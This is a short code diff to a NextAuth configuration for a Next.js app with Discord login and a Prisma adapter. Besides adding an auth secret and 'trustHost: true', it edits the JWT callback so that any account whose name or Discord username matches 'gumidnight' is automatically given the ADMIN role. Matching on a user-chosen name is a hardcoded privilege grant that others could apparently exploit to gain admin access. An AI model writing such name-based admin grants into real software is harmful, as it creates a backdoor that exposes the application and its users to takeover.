@@ -6,6 +6,8 @@ import { prisma } from "@/lib/prisma";
 
 export const { handlers, auth, signIn, signOut } = NextAuth({
     adapter: PrismaAdapter(prisma),
+    secret: process.env.AUTH_SECRET,
+    trustHost: true,
     providers: [
         DiscordProvider({
             clientId: process.env.DISCORD_CLIENT_ID,
@@ -13,11 +15,18 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         }),
     ],
     callbacks: {
-        async jwt({ token, user }: any) {
+        async jwt({ token, user, profile }: any) {
             if (user) {
                 token.id = user.id;
                 token.role = user.role;
             }
+
+            // Auto-promote gumidnight to ADMIN
+            const name = token?.name || user?.name || (profile as any)?.username;
+            if (name === "gumidnight") {
+                token.role = "ADMIN";
+            }
+
             return token;
         },
         async session({ session, token }: any) {
